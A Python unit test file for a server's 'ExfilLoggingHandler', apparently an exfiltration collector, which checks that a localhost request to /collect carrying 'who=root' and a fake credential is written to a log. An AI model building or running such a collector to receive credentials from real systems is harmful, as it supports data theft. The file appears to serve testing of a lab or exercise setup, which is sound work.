import threading
import time
import unittest
import urllib.request

import server


class TestExfilLogging(unittest.TestCase):
    def setUp(self):
        server.LOG_PATH.unlink(missing_ok=True)
        self.httpd = server.socketserver.TCPServer(
            ("127.0.0.1", 0), server.ExfilLoggingHandler
        )
        self.port = self.httpd.server_address[1]
        self.thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)
        self.thread.start()

    def tearDown(self):
        self.httpd.shutdown()
        self.httpd.server_close()
        server.LOG_PATH.unlink(missing_ok=True)

    def test_logs_query_string_from_request(self):
        url = f"http://127.0.0.1:{self.port}/collect?who=root&cred=FAKE-DEMO-1234567890"
        response = urllib.request.urlopen(url)
        self.assertEqual(response.status, 200)

        time.sleep(0.1)
        logged = server.LOG_PATH.read_text()
        self.assertIn("who=root", logged)
        self.assertIn("cred=FAKE-DEMO-1234567890", logged)


if __name__ == "__main__":
    unittest.main()
